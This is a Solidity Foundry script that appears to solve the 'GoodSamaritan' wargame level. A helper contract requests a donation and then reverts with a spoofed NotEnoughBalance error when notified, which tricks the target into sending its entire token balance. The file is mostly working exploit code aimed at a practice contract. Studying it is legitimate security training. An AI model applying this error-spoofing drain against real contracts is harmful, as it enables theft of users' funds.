// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0 <0.9.0;

import {Script, console} from "forge-std/Script.sol";
import { GoodSamaritan } from "../src/GoodSamaritan.sol";


contract Notifyable {
	
	GoodSamaritan public instance = GoodSamaritan(0x13844c5B40fC3Eb380D0671db7774415003b94AD);
	

	error NotEnoughBalance();

	function attack () external {
	
		instance.requestDonation();
	
	}


	function notify(uint256 amount) external
	{
		if (amount == 10)
			revert NotEnoughBalance();
	}
}

contract GoodSamaritanSolver is Script {
	
	GoodSamaritan public instance = GoodSamaritan(0x13844c5B40fC3Eb380D0671db7774415003b94AD);

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

	function run () external {

		vm.startBroadcast(prv);



		Notifyable n = new Notifyable();
	
		n.attack();

		console.logBytes32(bytes32(instance.coin().balances(address(n))));
		console.logBytes32(bytes32(instance.coin().balances(address(instance))));
	
		// console.log(instance.wallet().owner());

		// for (int i = 0; i < 3; i++)
		// {
		// 	console.logBytes32(bytes32(instance.coin().balances(me)));

		//	console.logBytes32(bytes32(instance.coin().balances(address(instance.wallet()))));
		//	console.log(instance.requestDonation());
		//}
		


		vm.stopBroadcast();


	}

}
